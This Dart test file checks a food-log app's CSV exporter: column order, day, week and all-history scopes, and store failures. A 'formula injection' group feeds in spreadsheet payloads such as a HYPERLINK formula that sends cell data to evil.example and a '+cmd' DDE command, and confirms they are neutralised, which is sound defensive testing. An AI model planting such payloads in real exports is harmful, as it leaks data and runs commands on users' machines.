// CSV exporter tests (Story 4.2 / AD-9 / NFR10).
//
// Pins: the documented header, the empty-history header-only
// shape, the visible-day scope using the local calendar day,
// the week scope using seven local calendar days, and the
// all-history scope returning the full list.

import 'dart:async';

import 'package:domain_core/domain_core.dart';
import 'package:integrations/integrations.dart';
import 'package:test/test.dart';

class _FakeStore implements EncryptedStore {
  @override
  Future<DeletePlateResult> deletePlate(int plateLogId) async =>
      const PlateDeleted();

  _FakeStore(this._plates);
  final List<PlateLog> _plates;
  @override
  Future<RecordPlateResult> recordPlate({
    required List<FoodEntryDraft> entries,
    DateTime? loggedAtUtc,
  }) async {
    throw UnimplementedError();
  }

  @override
  Stream<List<PlateLog>> watchRange({
    required DateTime from,
    required DateTime to,
  }) async* {
    yield platesInRange(_plates, from: from, to: to);
  }

  @override
  Future<ReadPlatesResult> readRange({DateTime? from, DateTime? to}) async =>
      PlatesRead(platesInRange(_plates, from: from, to: to));

  @override
  Future<void> close() async {}
}

class _FailingStore extends _FakeStore {
  _FailingStore(this._cause) : super(const <PlateLog>[]);
  final EncryptedStoreFailure _cause;

  @override
  Future<ReadPlatesResult> readRange({DateTime? from, DateTime? to}) async {
    return switch (_cause) {
      WebSessionKeyFailure() => const PlatesReadFailed(
        StoreFailure(encryptedStoreError: WebSessionKeyFailure()),
      ),
      _ => const PlatesReadFailed(
        StoreFailure(encryptedStoreError: StoreOperationFailure()),
      ),
    };
  }
}

class _SpyStore extends _FakeStore {
  _SpyStore() : super(const <PlateLog>[]);
  DateTime? from;
  DateTime? to;

  @override
  Future<ReadPlatesResult> readRange({DateTime? from, DateTime? to}) async {
    this.from = from;
    this.to = to;
    return const PlatesRead(<PlateLog>[]);
  }
}

PlateLog _plate(int id, DateTime loggedAt, List<FoodEntry> entries) {
  return PlateLog(id: id, loggedAtUtc: loggedAt.toUtc(), entries: entries);
}

FoodEntry _entry(int id, int plateId, String name) {
  return FoodEntry(
    id: id,
    plateLogId: plateId,
    databaseFood: DatabaseFood(
      sourceRef: 'ref-$id',
      displayName: name,
      source: SourceCatalog.manual,
    ),
    quantity: const QuantityRange(
      low: 1,
      high: 2,
      unit: 'fist',
      displayLabel: '1–2 fists',
    ),
  );
}

Future<List<PlateLog>> _plates(Future<ExportResult> pending) async =>
    ((await pending) as ExportReady).plates;

void main() {
  group('CsvExporter', () {
    test('header is the documented column order', () {
      final csv = serializePlatesToCsv(const <PlateLog>[]);
      expect(csv, startsWith(kCsvHeader));
      expect(csv, endsWith('\n'));
    });

    test('empty history emits a header-only file', () {
      final csv = serializePlatesToCsv(const <PlateLog>[]);
      expect(csv.split('\n').where((l) => l.isNotEmpty).length, 1);
    });

    test('one plate one entry emits one header + one data row', () {
      final plate = _plate(1, DateTime(2026, 8, 16, 9), [
        _entry(1, 1, 'Oatmeal'),
      ]);
      final csv = serializePlatesToCsv([plate]);
      final lines = csv.split('\n').where((l) => l.isNotEmpty).toList();
      expect(lines.length, 2);
      expect(lines[0], equals(kCsvHeader));
      expect(lines[1], contains('Oatmeal'));
      expect(lines[1], contains('2026-08-16'));
    });

    test('one plate two entries emits two data rows', () {
      final plate = _plate(1, DateTime(2026, 8, 16, 9), [
        _entry(1, 1, 'A'),
        _entry(2, 1, 'B'),
      ]);
      final csv = serializePlatesToCsv([plate]);
      final lines = csv.split('\n').where((l) => l.isNotEmpty).toList();
      expect(lines.length, 3);
    });

    group('N2: formula injection', () {
      FoodEntry entryWith({
        required String name,
        String ref = 'ref-1',
        String unit = 'g',
        String label = '1 g',
        num low = 1,
        num high = 2,
      }) => FoodEntry(
        id: 1,
        plateLogId: 1,
        databaseFood: DatabaseFood(
          sourceRef: ref,
          displayName: name,
          source: SourceCatalog.manual,
        ),
        quantity: QuantityRange(
          low: low,
          high: high,
          unit: unit,
          displayLabel: label,
        ),
      );

      String row(FoodEntry e) {
        final csv = serializePlatesToCsv([
          _plate(1, DateTime(2026, 8, 16, 9), [e]),
        ]);
        return csv.substring(kCsvHeader.length + 1);
      }

      test('=HYPERLINK(...) is neutralised with a leading apostrophe', () {
        final r = row(
          entryWith(name: '=HYPERLINK("http://evil.example/?x="&A1,"click")'),
        );
        expect(
          r,
          contains('"\'=HYPERLINK(""http://evil.example/?x=""&A1,""click"")"'),
        );
        expect(r, isNot(contains(',=HYPERLINK')));
        expect(r, isNot(contains('"=HYPERLINK')));
      });

      test('+cmd, @SUM, -2+3, TAB and CR prefixes are all neutralised', () {
        for (final name in [
          '+cmd|\' /C calc\'!A0',
          '@SUM(1+1)',
          '-2+3',
          '\t=1+1',
          '\r=1+1',
          '=1+1',
        ]) {
          final r = row(entryWith(name: name));
          final cells = _splitCsvRow(r.trimRight());
          final cell = cells[5]; // database_food_display_name
          expect(cell, startsWith("'"), reason: name);
          expect(cell.substring(1), name);
        }
      });

      test('every TEXT column is neutralised (ref, unit, label)', () {
        final r = row(
          entryWith(name: 'ok', ref: '=ref', unit: '@unit', label: '+label'),
        );
        final cells = _splitCsvRow(r.trimRight());
        expect(cells[4], "'=ref");
        expect(cells[8], "'@unit");
        expect(cells[9], "'+label");
      });

      test('numeric quantity columns stay NUMBERS (zero, decimal)', () {
        // (Negative quantities are no longer representable — F10 — so the
        // formula-guard for numbers is checked with 0 and a decimal.)
        final r = row(entryWith(name: 'ok', low: 0, high: 0.5));
        final cells = _splitCsvRow(r.trimRight());
        expect(cells[6], '0');
        expect(cells[7], '0.5');
        expect(r, isNot(contains("'0")));
      });

      test('ordinary text and hyphens inside the text are untouched', () {
        final r = row(entryWith(name: 'Rice - brown', label: '1–2 fists'));
        final cells = _splitCsvRow(r.trimRight());
        expect(cells[5], 'Rice - brown');
        expect(cells[9], '1–2 fists');
      });

      test('whitespace before the operator does not hide a formula', () {
        for (final name in [' =1+1', '  +cmd', '\u00A0@SUM(A1)', '\n=1+1']) {
          final cell = _splitCsvRow(row(entryWith(name: name)).trimRight())[5];
          expect(cell, startsWith("'"), reason: name);
        }
      });

      test('full-width operators are neutralised', () {
        for (final name in ['＝1+1', '＋cmd', '－2', '＠SUM(A1)', ' ＝1']) {
          final cell = _splitCsvRow(row(entryWith(name: name)).trimRight())[5];
          expect(cell, startsWith("'"), reason: name);
        }
      });

      test('fields containing ; or TAB are quoted', () {
        expect(row(entryWith(name: 'a;b')), contains('"a;b"'));
        expect(row(entryWith(name: 'a\tb')), contains('"a\tb"'));
      });

      test('a field containing CR is quoted', () {
        final r = row(entryWith(name: 'a\rb'));
        expect(r, contains('"a\rb"'));
      });

      test('field length is capped', () {
        final r = row(entryWith(name: 'x' * 5000));
        final cells = _splitCsvRow(r.trimRight());
        expect(cells[5].length, kMaxCsvFieldLength);
      });
    });

    test('readPlates visibleDay filters to the local day', () async {
      final store = _FakeStore([
        _plate(1, DateTime(2026, 8, 16, 9), [_entry(1, 1, 'A')]),
        _plate(2, DateTime(2026, 8, 17, 9), [_entry(2, 2, 'B')]),
      ]);
      final exp = CsvExporter(store: store);
      final got = await _plates(
        exp.readPlates(scope: ExportScope.visibleDay(DateTime(2026, 8, 16))),
      );
      expect(got.length, 1);
      expect(got.first.id, 1);
    });

    test('readPlates week filters to seven local days', () async {
      final store = _FakeStore([
        _plate(1, DateTime(2026, 8, 10, 9), [_entry(1, 1, 'Before')]),
        _plate(2, DateTime(2026, 8, 11, 9), [_entry(2, 2, 'Start')]),
        _plate(3, DateTime(2026, 8, 17, 9), [_entry(3, 3, 'End')]),
        _plate(4, DateTime(2026, 8, 18, 9), [_entry(4, 4, 'After')]),
      ]);
      final exp = CsvExporter(store: store);
      final got = await _plates(
        exp.readPlates(scope: ExportScope.week(DateTime(2026, 8, 11))),
      );
      expect(got.map((p) => p.id), [3, 2]); // newest first
    });

    test('readPlates allHistory returns the full list', () async {
      final store = _FakeStore([
        _plate(1, DateTime(2026, 8, 16, 9), [_entry(1, 1, 'A')]),
        _plate(2, DateTime(2026, 8, 17, 9), [_entry(2, 2, 'B')]),
      ]);
      final exp = CsvExporter(store: store);
      final got = await _plates(
        exp.readPlates(scope: const ExportScope.allHistory()),
      );
      expect(got.length, 2);
    });

    test('F2: food_group is the LAST column and round-trips the group', () {
      expect(kCsvHeader, endsWith(',food_group'));
      final plate = _plate(1, DateTime(2026, 8, 16, 9), [
        FoodEntry(
          id: 1,
          plateLogId: 1,
          databaseFood: const DatabaseFood(
            sourceRef: 'seed:egg',
            displayName: 'Egg',
            source: SourceCatalog.seed,
            foodGroup: FoodGroup.protein,
          ),
          quantity: const QuantityRange(
            low: 1,
            high: 2,
            unit: 'piece',
            displayLabel: '~1-2',
          ),
        ),
      ]);
      final cells = _splitCsvRow(serializePlatesToCsv([plate]).split('\n')[1]);
      expect(cells, hasLength(kCsvHeader.split(',').length));
      expect(cells.last, 'protein');
      expect(cells[3], 'seed');
    });

    test('a locked / failing store is a typed export failure', () async {
      final locked = CsvExporter(
        store: _FailingStore(const WebSessionKeyFailure()),
      );
      expect(
        await locked.readPlates(scope: const ExportScope.allHistory()),
        isA<StoreClosed>(),
      );
      final broken = CsvExporter(
        store: _FailingStore(const StoreOperationFailure()),
      );
      expect(
        await broken.readPlates(scope: const ExportScope.allHistory()),
        isA<ExportReadFailed>(),
      );
    });

    test(
      'the range read is bounded in the store, not filtered after',
      () async {
        final store = _SpyStore();
        await CsvExporter(
          store: store,
        ).readPlates(scope: ExportScope.visibleDay(DateTime(2026, 3, 29, 15)));
        expect(store.from, DateTime(2026, 3, 29));
        expect(store.to, DateTime(2026, 3, 30));
      },
    );

    test('streamPlates emits ExportReady on success', () async {
      final store = _FakeStore([
        _plate(1, DateTime(2026, 8, 16, 9), [_entry(1, 1, 'A')]),
      ]);
      final exp = CsvExporter(store: store);
      final stream = exp.streamPlates(
        format: ExportFormat.csv,
        scope: const ExportScope.allHistory(),
      );
      final r = await stream.first;
      expect(r, isA<ExportReady>());
    });

    test('streamPlates emits ExportFormatFailure on JSON request', () async {
      final store = _FakeStore(const <PlateLog>[]);
      final exp = CsvExporter(store: store);
      final stream = exp.streamPlates(
        format: ExportFormat.json,
        scope: const ExportScope.allHistory(),
      );
      final r = await stream.first;
      expect(r, isA<ExportFormatFailure>());
    });
  });
}

/// Minimal RFC-4180 row splitter for the tests (handles quotes, doubled
/// quotes, embedded commas / newlines).
List<String> _splitCsvRow(String row) {
  final cells = <String>[];
  final cur = StringBuffer();
  var quoted = false;
  for (var i = 0; i < row.length; i++) {
    final c = row[i];
    if (quoted) {
      if (c == '"') {
        if (i + 1 < row.length && row[i + 1] == '"') {
          cur.write('"');
          i++;
        } else {
          quoted = false;
        }
      } else {
        cur.write(c);
      }
    } else if (c == '"') {
      quoted = true;
    } else if (c == ',') {
      cells.add(cur.toString());
      cur.clear();
    } else {
      cur.write(c);
    }
  }
  cells.add(cur.toString());
  return cells;
}
